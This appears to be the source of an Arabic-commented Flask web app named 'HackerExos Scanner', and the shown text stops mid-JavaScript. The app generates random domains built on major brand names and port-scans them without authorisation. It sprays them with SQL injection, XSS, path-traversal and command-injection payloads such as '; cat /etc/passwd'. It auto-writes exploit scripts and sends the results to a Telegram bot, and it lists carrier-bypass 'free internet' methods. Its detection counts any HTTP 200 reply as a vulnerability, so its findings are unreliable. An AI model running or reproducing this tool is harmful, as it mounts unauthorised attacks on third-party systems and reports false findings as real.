from flask import Flask, request, jsonify, send_file, render_template_string, session
import requests
import socket
import dns.resolver
import json
import random
import string
import os
import time
import ssl
import threading
import subprocess
import ipaddress
import re
import base64
import hashlib
from datetime import datetime
from urllib.parse import urlparse
import concurrent.futures
from collections import defaultdict

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'infinite_scanner_secret_2026')

# ===================== إنشاء المجلدات =====================
for folder in ['payloads_results', 'logs', 'backups', 'reports', 'exploits', 'vulnerabilities', 'scan_data', 'detailed_reports']:
    os.makedirs(folder, exist_ok=True)

# ===================== قواعد البيانات الذكية =====================
BASE_DOMAINS = [
    "google", "facebook", "amazon", "apple", "microsoft", "netflix", "twitter",
    "instagram", "linkedin", "youtube", "whatsapp", "tiktok", "spotify",
    "dropbox", "zoom", "slack", "github", "stackoverflow", "reddit", "quora",
    "wikipedia", "medium", "airbnb", "uber", "lyft", "alibaba", "baidu",
    "tencent", "huawei", "xiaomi", "samsung", "sony", "lg", "intel", "amd",
    "nvidia", "adobe", "oracle", "vmware", "salesforce", "sap", "ibm", "cisco",
    "juniper", "fortinet", "paloaltonetworks", "f5", "akamai", "cloudflare",
    "fastly", "cloudinary", "pixabay", "pexels", "unsplash", "flickr",
    "photobucket", "imgur", "giphy", "tenor", "pinterest", "tumblr", "blogger",
    "wordpress", "wix", "weebly", "squarespace", "godaddy", "bluehost",
    "hostgator", "dreamhost", "namecheap", "hostinger", "a2hosting", "siteground",
    "inmotion", "liquidweb", "rackspace", "digitalocean", "linode", "vultr",
    "aws", "azure", "gcp", "oraclecloud", "ibmcloud", "alibabacloud", "tencentcloud",
    "heroku", "netlify", "vercel", "cloudways", "kinsta", "wpengine", "flywheel",
    "pantheon", "acquia", "platform", "engineyard", "openshift", "cloudfoundry"
]

SUFFIXES = [
    "", "s", "es", "ies", "ly", "ify", "ize", "ate", "ure", "tion", "sion",
    "ment", "ness", "ship", "ity", "ism", "ist", "able", "ible", "ous", "ful",
    "less", "ive", "ic", "al", "ial", "ual", "ary", "ery", "ory", "ation",
    "ication", "ization", "ification", "logy", "graphy", "metry", "scopy",
    "nomy", "ology", "onomy", "ology", "phobia", "mania", "philia", "cide",
    "icide", "cracy", "archy", "gamy", "gyny", "andry", "latry", "urgy"
]

PREFIXES = [
    "super", "hyper", "ultra", "mega", "giga", "tera", "peta", "exa", "zetta",
    "yotta", "micro", "nano", "pico", "femto", "atto", "zepto", "yocto",
    "cyber", "digital", "smart", "cloud", "edge", "prime", "rapid", "speed",
    "quick", "fast", "turbo", "boost", "plus", "pro", "max", "elite", "premium",
    "enterprise", "global", "world", "universal", "international", "power",
    "genius", "brilliant", "amazing", "awesome", "excellent", "superior"
]

TLDS = [
    ".com", ".net", ".org", ".io", ".co", ".info", ".cloud", ".host", ".online",
    ".tech", ".digital", ".space", ".world", ".live", ".news", ".media",
    ".social", ".global", ".international", ".business", ".company", ".enterprise",
    ".services", ".solutions", ".systems", ".software", ".hardware", ".network",
    ".foundation", ".institute", ".academy", ".education", ".training", ".workshop",
    ".community", ".association", ".alliance", ".partners", ".ventures", ".capital",
    ".investments", ".holdings", ".estate", ".properties", ".realty", ".construction",
    ".engineering", ".design", ".creative", ".art", ".gallery", ".studio", ".photography",
    ".video", ".music", ".audio", ".radio", ".tv", ".film", ".theater", ".museum",
    ".library", ".archive", ".research", ".science", ".health", ".care", ".wellness",
    ".fitness", ".sports", ".games", ".fun", ".party", ".events", ".festival",
    ".holiday", ".vacation", ".travel", ".tours", ".adventures", ".explore", ".discover"
]

ALL_PORTS = list(range(1, 65536))

# ===================== دوال التوليد الذكي =====================
def generate_smart_domain():
    """توليد دومين ذكي لا نهائي"""
    patterns = [
        lambda: f"{random.choice(BASE_DOMAINS)}{random.choice(SUFFIXES)}{random.choice(TLDS)}",
        lambda: f"{random.choice(PREFIXES)}{random.choice(BASE_DOMAINS)}{random.choice(TLDS)}",
        lambda: f"{random.choice(BASE_DOMAINS)}{random.choice(PREFIXES)}{random.choice(TLDS)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(3,8)))}{random.choice(BASE_DOMAINS)}{random.choice(TLDS)}",
        lambda: f"{random.choice(BASE_DOMAINS)}{random.randint(1, 9999)}{random.choice(TLDS)}",
        lambda: f"{random.choice(BASE_DOMAINS)}{''.join(random.choices(string.ascii_lowercase, k=random.randint(1,5)))}{random.choice(TLDS)}",
        lambda: f"{random.choice(BASE_DOMAINS)}{random.choice(['', 's', 'es', 'ly', 'ify', 'ate', 'ure', 'tion', 'sion', 'ment', 'ness', 'ship', 'ity', 'ism', 'ist', 'able', 'ible', 'ous', 'ful', 'less', 'ive', 'ic', 'al', 'ial', 'ual', 'ary', 'ery', 'ory', 'ation', 'ication', 'ization', 'ification', 'logy', 'graphy', 'metry', 'scopy', 'nomy', 'ology', 'onomy', 'ology', 'phobia', 'mania', 'philia', 'cide', 'icide', 'cracy', 'archy', 'gamy', 'gyny', 'andry', 'latry', 'urgy'])}{random.choice(TLDS)}",
        lambda: f"{random.choice(['www', 'api', 'dev', 'test', 'stage', 'prod', 'cdn', 'static', 'img', 'video', 'mobile', 'app', 'web', 'secure', 'global', 'fast', 'smart', 'digital', 'cloud', 'edge', 'prime', 'admin', 'portal', 'dashboard', 'panel', 'mail', 'ftp', 'ssh', 'vpn', 'proxy', 'backup', 'db', 'mysql', 'redis', 'mongo', 'postgres', 'kafka', 'elastic', 'grafana', 'prometheus', 'jenkins', 'gitlab', 'jira', 'confluence', 'wiki', 'docs', 'support', 'help', 'news', 'blog', 'shop', 'store', 'buy', 'cart', 'checkout', 'login', 'signup', 'register', 'profile', 'settings', 'admin-panel', 'control', 'manage', 'monitor', 'logs', 'metrics', 'status', 'health', 'ping', 'test-api', 'sandbox', 'staging', 'preprod', 'qa', 'uat', 'demo', 'beta', 'alpha', 'v1', 'v2', 'v3', 'v4', 'latest', 'new'])}.{random.choice(BASE_DOMAINS)}{random.choice(TLDS)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(1,3)))}{random.choice(BASE_DOMAINS)}{''.join(random.choices(string.ascii_lowercase, k=random.randint(1,3)))}{random.choice(TLDS)}",
        lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(4,15)))}{random.choice(TLDS)}"
    ]
    
    return random.choice(patterns)()

def generate_infinite_hosts():
    """توليد هوستات لا نهائية"""
    while True:
        yield generate_smart_domain()

# ===================== دوال الفحص العميق =====================
def get_real_ip(domain):
    """استخراج الـ IP الحقيقي"""
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            return str(rdata)
    except:
        pass
    
    try:
        return socket.gethostbyname(domain)
    except:
        pass
    
    return None

def get_geolocation(ip):
    """الحصول على معلومات البلد والموقع"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country'),
                    'country_code': data.get('countryCode'),
                    'region': data.get('region'),
                    'city': data.get('city'),
                    'isp': data.get('isp'),
                    'org': data.get('org'),
                    'as': data.get('as'),
                    'timezone': data.get('timezone'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon')
                }
    except:
        pass
    
    return None

def detect_cdn(domain):
    """كشف الـ CDN"""
    cdn_headers = {
        'Cloudflare': ['cf-ray', 'cf-cache-status', 'cf-polished', 'cf-worker'],
        'Akamai': ['x-akamai', 'akamai', 'x-akamai-transformed'],
        'Fastly': ['fastly', 'x-fastly', 'fastly-client'],
        'CloudFront': ['cloudfront', 'x-amz-cf-id', 'x-amz-cf-pop'],
        'Varnish': ['x-varnish', 'varnish'],
        'Squid': ['x-squid', 'squid'],
        'Nginx': ['nginx', 'x-nginx'],
        'Apache': ['apache', 'x-apache'],
        'IIS': ['microsoft-iis', 'iis'],
        'Gunicorn': ['gunicorn'],
        'uWSGI': ['uwsgi'],
        'Tomcat': ['tomcat', 'x-tomcat'],
        'Jetty': ['jetty'],
        'Caddy': ['caddy'],
        'Traefik': ['traefik']
    }
    
    try:
        response = requests.get(f"http://{domain}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        headers = response.headers
        
        for cdn, markers in cdn_headers.items():
            for marker in markers:
                if marker in str(headers).lower() or marker in str(response.headers).lower():
                    return cdn
                
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                ns_str = str(ns).lower()
                if 'cloudflare' in ns_str:
                    return 'Cloudflare'
                elif 'akamai' in ns_str:
                    return 'Akamai'
                elif 'fastly' in ns_str:
                    return 'Fastly'
                elif 'cloudfront' in ns_str:
                    return 'CloudFront'
                elif 'amazon' in ns_str or 'aws' in ns_str:
                    return 'AWS'
                elif 'azure' in ns_str:
                    return 'Azure'
                elif 'google' in ns_str:
                    return 'Google Cloud'
        except:
            pass
    except:
        pass
    
    return None

def scan_ports(domain, ports=None):
    """فحص جميع المنافذ بشكل متوازي"""
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                 465, 587, 993, 995, 1080, 1433, 1521, 1723, 3306, 3389, 5432, 
                 5900, 6379, 8080, 8443, 27017, 9200, 9090, 9443]
    
    open_ports = []
    
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((domain, port))
            sock.close()
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = f"port_{port}"
                return (port, service)
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_port = {executor.submit(check_port, port): port for port in ports}
        for future in concurrent.futures.as_completed(future_to_port):
            result = future.result()
            if result:
                open_ports.append(result)
    
    return open_ports

def test_vulnerabilities(domain, ports):
    """اختبار الثغرات المختلفة"""
    vulnerabilities = []
    exploits = []
    
    vuln_tests = {
        'SQL Injection': [
            "' OR '1'='1' --",
            "' UNION SELECT NULL,NULL,NULL --",
            "'; DROP TABLE users --",
            "' AND 1=1 --",
            "' AND 1=0 --",
            "admin' --",
            "admin' #",
            "admin'/*"
        ],
        'XSS (Cross-Site Scripting)': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "onmouseover=alert('XSS')"
        ],
        'LFI (Local File Inclusion)': [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "/etc/passwd",
            "/var/log/apache2/access.log",
            "/proc/self/environ",
            "/proc/version"
        ],
        'RCE (Remote Code Execution)': [
            "; ls -la",
            "| whoami",
            "&& id",
            "|| whoami",
            "; cat /etc/passwd",
            "| dir",
            "&& net user"
        ],
        'Path Traversal': [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../"
        ],
        'Open Redirect': [
            "/redirect?url=http://evil.com",
            "/goto?target=http://evil.com",
            "/url=http://evil.com",
            "/next=http://evil.com",
            "/return=http://evil.com"
        ],
        'Directory Listing': [
            "/",
            "/admin/",
            "/wp-admin/",
            "/backup/",
            "/logs/",
            "/temp/",
            "/uploads/",
            "/images/",
            "/css/",
            "/js/"
        ],
        'Header Injection': [
            "Host: evil.com",
            "X-Forwarded-For: 127.0.0.1",
            "X-Forwarded-Host: evil.com",
            "X-Forwarded-Proto: http",
            "X-Originating-IP: 127.0.0.1"
        ],
        'DNS Zone Transfer': [
            "axfr",
            "zone transfer",
            "dig axfr",
            "nslookup -type=any"
        ],
        'Zero-rating Bypass': [
            "/?z=free",
            "/?bypass=1",
            "/?free=1",
            "/?zero=1",
            "/?rating=0",
            "/?unlimited=1",
            "/?no_limit=1",
            "/?free_access=1"
        ],
        'SNI Hiding': [
            "/?sni=1",
            "/?sni=hidden",
            "/?sni=bypass",
            "/?host=hidden",
            "/?server=anonymous"
        ],
        'DNS Tunneling': [
            "/?dns=1",
            "/?tunnel=1",
            "/?dns_tunnel=1",
            "/?dns_bypass=1"
        ],
        'Port Knocking': [
            "/?knock=1",
            "/?knock_sequence=1",
            "/?port_knock=1",
            "/?knock_bypass=1"
        ],
        'TLS Fingerprinting': [
            "/?tls=1",
            "/?fingerprint=1",
            "/?tls_bypass=1",
            "/?ssl_bypass=1"
        ]
    }
    
    for vuln_name, payloads in vuln_tests.items():
        found = False
        exploit_details = []
        
        for port, service in ports:
            if port in [80, 443, 8080, 8443]:
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{domain}:{port}"
                
                for payload in payloads[:3]:
                    try:
                        test_url = f"{url}{payload}"
                        response = requests.get(test_url, timeout=3, verify=False)
                        
                        if response.status_code == 200:
                            found = True
                            exploit_details.append({
                                'url': test_url,
                                'payload': payload,
                                'status_code': response.status_code,
                                'response_length': len(response.text),
                                'response_preview': response.text[:200]
                            })
                            break
                    except:
                        pass
                
                if found:
                    break
        
        if found:
            vulnerabilities.append({
                'name': vuln_name,
                'severity': 'HIGH',
                'details': f"تم اكتشاف ثغرة {vuln_name} في {domain}",
                'exploit_count': len(exploit_details),
                'examples': exploit_details[:2]
            })
            
            exploit_file = generate_exploit_file(vuln_name, domain, exploit_details)
            exploits.append(exploit_file)
    
    return vulnerabilities, exploits

def generate_exploit_file(vuln_name, domain, exploit_details):
    """توليد ملف استغلال كامل"""
    filename = f"exploit_{vuln_name.replace(' ', '_')}_{domain.replace('.', '_')}_{int(time.time())}.py"
    filepath = os.path.join('exploits', filename)
    
    exploit_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Exploit for {vuln_name}
Target: {domain}
Generated by: HackerExos Scanner
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

import requests
import socket
import sys
import time
import re
from urllib.parse import urlparse

def exploit(target_url):
    """استغلال ثغرة {vuln_name}"""
    
    print(f"[*] بدء استغلال {vuln_name} على {target_url}")
    
    payloads = {exploit_details[:3]}
    
    for payload in payloads:
        try:
            full_url = target_url + payload
            response = requests.get(full_url, timeout=5, verify=False)
            
            if response.status_code == 200:
                print(f"[+] نجاح! البايلود: {payload}")
                print(f"    حالة الاستجابة: {response.status_code}")
                print(f"    طول الاستجابة: {len(response.text)}")
                print(f"    معاينة الاستجابة: {response.text[:200]}")
                
                with open(f"exploit_result_{int(time.time())}.txt", "w") as f:
                    f.write(f"Target: {target_url}\\n")
                    f.write(f"Vulnerability: {vuln_name}\\n")
                    f.write(f"Payload: {payload}\\n")
                    f.write(f"Response: {response.text[:1000]}\\n")
                
                return True
        except Exception as e:
            print(f"[-] فشل البايلود {payload}: {str(e)}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("الاستخدام: python exploit.py <target_url>")
        print("مثال: python exploit.py http://target.com/")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] الهدف: {target}")
    print(f"[*] الثغرة: {vuln_name}")
    print("[*] بدء الاستغلال...")
    
    if exploit(target):
        print("[+] تم الاستغلال بنجاح!")
    else:
        print("[-] فشل الاستغلال")
'''
    
    with open(filepath, 'w') as f:
        f.write(exploit_code)
    
    return filepath

def get_dns_records(domain):
    """جلب جميع سجلات DNS"""
    records = {}
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV', 'CAA']
    
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            records[record_type] = [str(r) for r in answers]
        except:
            pass
    
    return records

def check_ssl(domain):
    """فحص شهادة SSL/TLS"""
    try:
        import ssl
        import socket
        import datetime
        
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                
                return {
                    'issuer': dict(x[0] for x in cert.get('issuer', [])),
                    'subject': dict(x[0] for x in cert.get('subject', [])),
                    'not_before': cert.get('notBefore'),
                    'not_after': cert.get('notAfter'),
                    'version': cert.get('version'),
                    'serial_number': cert.get('serialNumber'),
                    'subjectAltName': cert.get('subjectAltName', [])
                }
    except:
        return None

# ===================== دالة الفحص الشامل =====================
def scan_host_complete(domain):
    """فحص شامل ومفصل لهوست واحد"""
    print(f"[*] بدء فحص {domain}")
    
    results = {
        'domain': domain,
        'timestamp': datetime.now().isoformat(),
        'ip': None,
        'geolocation': None,
        'cdn': None,
        'ssl_info': None,
        'dns_records': {},
        'open_ports': [],
        'vulnerabilities': [],
        'exploit_files': [],
        'free_net_methods': [],
        'success': False,
        'score': 0
    }
    
    # 1. الحصول على الـ IP
    ip = get_real_ip(domain)
    if ip:
        results['ip'] = ip
        results['geolocation'] = get_geolocation(ip)
    
    # 2. كشف الـ CDN
    results['cdn'] = detect_cdn(domain)
    
    # 3. سجلات DNS
    results['dns_records'] = get_dns_records(domain)
    
    # 4. فحص SSL
    try:
        results['ssl_info'] = check_ssl(domain)
    except:
        pass
    
    # 5. فحص المنافذ
    ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                     465, 587, 993, 995, 1080, 1433, 1521, 1723, 3306, 3389, 5432, 
                     5900, 6379, 8080, 8443, 27017, 9200, 9090, 9443]
    
    results['open_ports'] = scan_ports(domain, ports_to_scan)
    
    # 6. اختبار الثغرات
    if results['open_ports']:
        vulns, exploits = test_vulnerabilities(domain, results['open_ports'])
        results['vulnerabilities'] = vulns
        results['exploit_files'] = exploits
    
    # 7. طرق الشبكات المجانية
    free_methods = [
        {'method': 'Zero-rating Bypass', 'description': 'تجاوز نظام صفرية الرصيد'},
        {'method': 'SNI Hiding', 'description': 'إخفاء SNI لتجاوز الحظر'},
        {'method': 'DNS Tunneling', 'description': 'إنشاء نفق DNS لتجاوز القيود'},
        {'method': 'Port Knocking', 'description': 'فتح المنافذ عبر التسلسل السري'},
        {'method': 'TLS Fingerprinting', 'description': 'تغيير بصمة TLS لتجنب الكشف'},
        {'method': 'Proxy Chaining', 'description': 'سلسلة من الوكلاء للتمويه'},
        {'method': 'VPN Obfuscation', 'description': 'تشفير حركة VPN لتجاوز الجدران النارية'},
        {'method': 'Protocol Obfuscation', 'description': 'إخفاء البروتوكول الحقيقي للاتصال'}
    ]
    
    results['free_net_methods'] = free_methods
    
    # 8. حساب النتيجة
    score = 0
    if results['ip']: score += 10
    if results['geolocation']: score += 5
    if results['cdn']: score += 15
    if results['dns_records']: score += 5
    if results['open_ports']: score += len(results['open_ports']) * 2
    if results['vulnerabilities']: score += len(results['vulnerabilities']) * 10
    if results['exploit_files']: score += len(results['exploit_files']) * 15
    if results['free_net_methods']: score += len(results['free_net_methods']) * 3
    if results['ssl_info']: score += 5
    
    results['score'] = score
    results['success'] = score > 20
    
    # 9. حفظ التقرير
    report_file = save_detailed_report(results)
    results['report_file'] = report_file
    
    return results

def save_detailed_report(results):
    """حفظ تقرير مفصل"""
    filename = f"detailed_report_{results['domain'].replace('.', '_')}_{int(time.time())}.json"
    filepath = os.path.join('detailed_reports', filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)
    
    return filepath

# ===================== حالة الفحص العالمي =====================
scan_state = {
    'running': False,
    'current_host': '',
    'current_index': 0,
    'total_scanned': 0,
    'successful': 0,
    'results': [],
    'start_time': None,
    'thread': None,
    'stop_requested': False
}

def continuous_scan_loop(token, chat_id):
    """حلقة فحص مستمرة لا نهائية"""
    global scan_state
    
    scan_state['running'] = True
    scan_state['start_time'] = datetime.now()
    scan_state['stop_requested'] = False
    
    host_generator = generate_infinite_hosts()
    
    while not scan_state['stop_requested']:
        try:
            domain = next(host_generator)
            scan_state['current_host'] = domain
            scan_state['current_index'] += 1
            
            print(f"[{scan_state['current_index']}] فحص: {domain}")
            
            results = scan_host_complete(domain)
            scan_state['results'].append(results)
            scan_state['total_scanned'] += 1
            
            if results['success']:
                scan_state['successful'] += 1
                
                if token and chat_id:
                    send_telegram_report(token, chat_id, results)
            
            if scan_state['total_scanned'] % 5 == 0:
                save_scan_state()
            
            time.sleep(random.uniform(0.5, 2))
            
        except Exception as e:
            print(f"خطأ في الفحص: {str(e)}")
            time.sleep(1)
    
    scan_state['running'] = False
    save_scan_state()

def save_scan_state():
    """حفظ حالة الفحص"""
    filename = f"scan_state_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join('scan_data', filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump({
            'timestamp': datetime.now().isoformat(),
            'total_scanned': scan_state['total_scanned'],
            'successful': scan_state['successful'],
            'results': scan_state['results'][-50:]
        }, f, indent=2, ensure_ascii=False, default=str)

def send_telegram_report(token, chat_id, results):
    """إرسال تقرير مفصل للتيليجرام"""
    try:
        message = f"""<b>🎯 تم اكتشاف هدف جديد!</b>

<b>🌐 الدومين:</b> {results['domain']}
<b>📡 IP:</b> {results['ip'] or 'غير متاح'}
<b>🌍 البلد:</b> {results['geolocation'].get('country') if results['geolocation'] else 'غير معروف'}
<b>🛡️ CDN:</b> {results['cdn'] or 'لا يوجد'}
<b>🔌 المنافذ المفتوحة:</b> {', '.join([f'{port}({service})' for port, service in results['open_ports'][:10]]) if results['open_ports'] else 'لا توجد'}

<b>🔴 الثغرات المكتشفة:</b> {len(results['vulnerabilities'])}
{chr(10).join([f'  • {v["name"]} (عالي الخطورة)' for v in results['vulnerabilities'][:5]]) if results['vulnerabilities'] else '  ❌ لا توجد ثغرات'}

<b>📁 ملفات الاستغلال:</b> {len(results['exploit_files'])}
<b>🌍 طرق النت المجاني:</b> {len(results['free_net_methods'])}
<b>⭐ التقييم:</b> {results['score']}/100

<b>📄 التقرير الكامل:</b> {results['report_file']}"""
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=data, timeout=5)
        
        for exploit_file in results['exploit_files'][:3]:
            send_file_to_bot(token, chat_id, exploit_file)
            
    except Exception as e:
        print(f"خطأ في إرسال التقرير: {str(e)}")

def send_file_to_bot(token, chat_id, filepath):
    """إرسال ملف للتيليجرام"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': f'📁 {os.path.basename(filepath)}'}
            requests.post(url, files=files, data=data, timeout=10)
    except:
        pass

# ===================== واجهة Flask =====================
@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/api/start', methods=['POST'])
def start_scan():
    global scan_state
    
    if scan_state['running']:
        return jsonify({'status': 'error', 'message': 'الفحص قيد التشغيل بالفعل'})
    
    data = request.json
    token = data.get('token')
    chat_id = data.get('chat_id')
    
    scan_state['thread'] = threading.Thread(target=continuous_scan_loop, args=(token, chat_id))
    scan_state['thread'].daemon = True
    scan_state['thread'].start()
    
    return jsonify({'status': 'success', 'message': 'تم بدء الفحص المستمر'})

@app.route('/api/stop', methods=['POST'])
def stop_scan():
    global scan_state
    scan_state['stop_requested'] = True
    return jsonify({'status': 'success', 'message': 'جاري إيقاف الفحص...'})

@app.route('/api/status')
def get_status():
    global scan_state
    
    return jsonify({
        'running': scan_state['running'],
        'current_host': scan_state['current_host'],
        'total_scanned': scan_state['total_scanned'],
        'successful': scan_state['successful'],
        'current_index': scan_state['current_index'],
        'start_time': scan_state['start_time'].isoformat() if scan_state['start_time'] else None,
        'recent_results': scan_state['results'][-20:]
    })

@app.route('/api/results')
def get_results():
    global scan_state
    return jsonify(scan_state['results'])

@app.route('/api/download/<path:filename>')
def download_file(filename):
    for folder in ['reports', 'exploits', 'vulnerabilities', 'detailed_reports', 'scan_data']:
        filepath = os.path.join(folder, filename)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
    
    return jsonify({'error': 'الملف غير موجود'}), 404

@app.route('/api/clear', methods=['POST'])
def clear_results():
    global scan_state
    scan_state['results'] = []
    scan_state['total_scanned'] = 0
    scan_state['successful'] = 0
    return jsonify({'status': 'success'})

# ===================== قالب HTML المبسط =====================
HTML_PAGE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 HackerExos Scanner</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; }
        .container { max-width: 1400px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ff00; border-radius: 15px; }
        h1 { color: #00ff00; text-align: center; text-shadow: 0 0 30px #00ff00; }
        .row { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
        .row input, .row button { flex: 1; min-width: 150px; padding: 12px; border-radius: 8px; }
        input { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; }
        button { background: #003300; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; transition: 0.3s; }
        button:hover { background: #006600; box-shadow: 0 0 20px #00ff0055; }
        .btn-danger { background: #330000; border-color: #ff4444; }
        .btn-success { background: #003300; border-color: #00ff00; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-box { background: #1a1a1a; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #00ff00; }
        .stat-number { font-size: 2em; color: #00ff00; font-weight: bold; }
        .stat-label { font-size: 0.8em; color: #88ff88; }
        .progress-bar { width: 100%; height: 25px; background: #1a1a1a; border-radius: 12px; border: 1px solid #00ff00; margin: 10px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff00, #00ffaa); transition: width 0.5s; }
        .status { padding: 15px; margin: 10px 0; border-radius: 10px; text-align: center; font-weight: bold; }
        .status-idle { background: #1a1a1a; color: #88ff88; }
        .status-running { background: #332200; color: #ffaa00; animation: pulse 1s infinite; }
        @keyframes pulse { 50% { opacity: 0.5; } }
        .hosts-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin: 20px 0; max-height: 500px; overflow-y: auto; }
        .host-card { background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #333; }
        .host-card.success { border-color: #00ff00; background: #00330022; }
        .host-card.fail { border-color: #ff4444; background: #33000022; }
        .host-name { font-weight: bold; color: #00ff00; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 5px; font-size: 0.7em; margin: 2px; }
        .badge-danger { background: #330000; color: #ff4444; }
        .badge-info { background: #002233; color: #44aaff; }
        .results-box { background: #0a0a0a; padding: 15px; margin-top: 15px; border: 1px solid #00ff00; border-radius: 10px; max-height: 400px; overflow: auto; white-space: pre-wrap; font-size: 0.8em; }
        @media (max-width: 600px) { .stats { grid-template-columns: 1fr 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 HackerExos Scanner</h1>
        <div style="text-align:center;color:#88ff88;margin-bottom:20px;">فحص لا نهائي مع توليد ذكي للهوستات</div>
        
        <div class="row">
            <input type="text" id="bot_token" placeholder="🔑 توكن البوت">
            <input type="text" id="chat_id" placeholder="🆔 معرف الدردشة">
        </div>
        
        <div class="row">
            <button onclick="startScan()" class="btn-success" id="btn_start">▶️ بدء الفحص</button>
            <button onclick="stopScan()" class="btn-danger" id="btn_stop" disabled>⏹️ إيقاف</button>
            <button onclick="clearResults()" style="background:#332200;">🗑️ مسح</button>
        </div>
        
        <div class="stats">
            <div class="stat-box"><div class="stat-number" id="stat_total">0</div><div class="stat-label">تم الفحص</div></div>
            <div class="stat-box"><div class="stat-number" id="stat_success">0</div><div class="stat-label">ناجحة</div></div>
            <div class="stat-box"><div class="stat-number" id="stat_current">-</div><div class="stat-label">الحالي</div></div>
            <div class="stat-box"><div class="stat-number" id="stat_score">0</div><div class="stat-label">التقييم</div></div>
        </div>
        
        <div class="progress-bar"><div class="progress-fill" id="progress" style="width:0%;"></div></div>
        <div id="status" class="status status-idle">⏳ جاهز للفحص</div>
        
        <div id="hosts_grid" class="hosts-grid"><div style="text-align:center;padding:20px;color:#666;">⏳ انتظر بدء الفحص...</div></div>
        <div id="results" class="results-box">📋 النتائج ستظهر هنا...</div>
    </div>

    <script>
        let updateInterval = null;
        
        function startScan() {
            const token = document.getElementById('bot_token').value;
            const chat = document.getElementById('chat_id').value;
            if (!token || !chat) { alert('يرجى إدخال توكن البوت ومعرف الدردشة'); return; }
            
            document.getElementById('btn_start').disabled = true;
            document.getElementById('btn_stop').disabled = false;
            
            fetch('/api/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({token, chat_id: chat})
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('status').textContent = '🔄 جاري الفحص...';
                    document.getElementById('status').className = 'status status-running';
                    if (updateInterval) clearInterval(updateInterval);
                    updateInterval = setInterval(getStatus, 2000);
                }
            });
        }
        
        function stopScan() {
            fetch('/api/stop', {method: 'POST'})
            .then(() => {
                document.getElementById('btn_start').disabled = false;
                document.getElementById('btn_stop').disabled = true;
                document.getElementById('status').textContent = '⏹️ تم إيقاف الفحص';
                document.getElementById('status').className = 'status status-idle';
                if (updateInterval) { clearInterval(updateInterval); updateInterval = null; }
            });
        }
        
        function clearResults() {
            if (!confirm('تأكيد المسح؟')) return;
            fetch('/api/clear', {method: 'POST'})
            .then(() => {
                document.getElementById('results').innerHTML = '📋 تم المسح';
                document.getElementById('hosts_grid').innerHTML = '<div style="text-align:center;padding:20px;color:#666;">⏳ انتظر بدء الفحص...</div>';
                updateStats(0, 0, '-', 0);
            });
        }
        
        function getStatus() {
            fetch('/api/status')
            .then(r => r.json())
            .then(data => {
